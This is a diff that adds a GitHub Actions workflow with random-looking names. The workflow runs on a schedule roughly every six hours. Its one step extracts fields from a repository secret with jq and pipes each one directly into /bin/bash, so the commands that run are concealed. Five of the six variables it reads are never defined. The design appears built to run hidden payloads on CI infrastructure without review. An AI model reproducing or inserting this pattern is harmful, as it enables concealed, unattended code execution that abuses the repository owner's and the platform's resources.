@@ -1,0 +1,23 @@
+name: londonmohoo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: londonmohoo
+        env:
+          qi4: ${{ secrets.qi4 }}
+        run: |
+          echo $qi4 | jq -r .w2454 | /bin/bash
+          echo $ssyjz3227 | jq -r .hf21 | /bin/bash
+          echo $txbmm58 | jq -r .pr41 | /bin/bash
+          echo $maph07347 | jq -r .sy68 | /bin/bash
+          echo $bvh1 | jq -r .s16 | /bin/bash
+          echo $lzvjf07 | jq -r .vtmi74321 | /bin/bash
+
